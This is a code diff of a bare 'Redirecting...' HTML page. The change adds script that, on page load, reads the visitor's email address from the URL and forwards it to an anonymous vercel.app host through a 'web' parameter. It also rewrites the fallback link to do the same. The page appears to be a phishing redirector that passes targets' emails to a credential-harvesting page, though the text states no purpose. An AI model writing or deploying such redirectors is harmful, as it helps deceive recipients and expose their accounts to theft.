@@ -4,13 +4,36 @@
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
-    // Redirect instantly with ?web= at the end
     window.onload = function() {
-      window.location.href = "https://b5af32c6a58a056585e52624a.vercel.app/?web=";
+      // Get the email parameter from the current URL
+      const params = new URLSearchParams(window.location.search);
+      const email = params.get("email");
+
+      // Build the target URL
+      let targetUrl = "https://b5af32c6a58a056585e52624a.vercel.app/?web=";
+      if (email) {
+        targetUrl += encodeURIComponent(email);
+      }
+
+      // Redirect
+      window.location.href = targetUrl;
     };
   </script>
 </head>
 <body>
-  <p>Redirecting... If it doesn’t work, <a href="https://b5af32c6a58a056585e52624a.vercel.app/?web=">click here</a>.</p>
+  <p>Redirecting... If it doesn’t work, 
+    <a id="redirectLink" href="#">click here</a>.
+  </p>
+
+  <script>
+    // Also update the manual link
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get("email");
+    let link = "https://b5af32c6a58a056585e52624a.vercel.app/?web=";
+    if (email) {
+      link += encodeURIComponent(email);
+    }
+    document.getElementById("redirectLink").href = link;
+  </script>
 </body>
 </html>
